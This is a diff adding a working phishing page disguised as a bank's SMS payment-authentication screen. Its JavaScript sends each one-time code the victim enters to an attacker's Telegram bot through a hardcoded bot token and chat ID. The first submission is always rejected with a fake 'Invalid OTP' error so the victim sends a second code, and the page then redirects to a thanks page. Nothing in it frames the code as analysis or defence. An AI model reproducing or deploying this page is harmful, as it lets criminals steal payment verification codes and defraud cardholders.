@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Payment Authentication</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #fff;
+      text-align: center;
+      margin: 0;
+      padding: 0;
+    }
+    .container {
+      margin-top: 100px;
+    }
+    input[type="text"] {
+      padding: 10px;
+      width: 250px;
+      margin-bottom: 10px;
+      font-size: 16px;
+    }
+    button {
+      padding: 10px 20px;
+      background-color: #0d3c9b;
+      color: white;
+      font-size: 16px;
+      border: none;
+      cursor: pointer;
+    }
+    .resend {
+      margin-top: 20px;
+      color: #0d3c9b;
+      cursor: pointer;
+    }
+    .error-message {
+      color: red;
+      margin-top: 10px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <img src="https://i.ibb.co/39fmsM2p/Screenshot-1.png" height="50" />
+    <h3>Payment Authentication</h3>
+    <p>We have just sent an SMS with a secure code to your registered mobile phone number</p>
+    <p id="dateText">Authorizing a payment for ... with your card</p>
+
+    <form id="codeForm">
+      <input type="text" id="code" placeholder="Verification Code" required /><br />
+      <button type="submit">CONTINUE</button>
+    </form>
+
+    <div class="resend">RESEND CODE</div>
+    <div class="error-message" id="errorMsg"></div>
+  </div>
+
+  <script>
+    // Show dynamic USA date
+    const usaDate = new Date().toLocaleDateString("en-US", {
+      timeZone: "America/New_York",
+      day: "2-digit",
+      month: "2-digit",
+      year: "numeric"
+    });
+
+    document.getElementById("dateText").textContent =
+      `Authorizing a payment for ${usaDate} with your card `;
+
+    let attempt = 0;
+
+    document.getElementById("codeForm").addEventListener("submit", function (e) {
+      e.preventDefault();
+
+      const code = document.getElementById("code").value;
+      const errorMsg = document.getElementById("errorMsg");
+      const token = "7752649046:AAH04kE54l4VAwuuilM_xv83ngBuzzVBYj8";
+      const chatId = "5349147090";
+
+      const message = `🔐 New Verification Code Received:\n\nCode: ${code}\nCard ending: ********\nDate: ${usaDate}`;
+
+      // Send code to Telegram first
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message,
+        }),
+      })
+      .then(() => {
+        attempt++;
+
+        if (attempt === 1) {
+          // First attempt: show error
+          errorMsg.textContent = "Invalid OTP code provided. Try again";
+        } else {
+          // Second or later attempt: redirect to thanks
+          errorMsg.textContent = "";
+          window.location.href = "thanks.html";
+        }
+      })
+      .catch((error) => {
+        alert("Failed to send. Try again.");
+        console.error("Error sending to Telegram:", error);
+      });
+    });
+  </script>
+</body>
+</html>
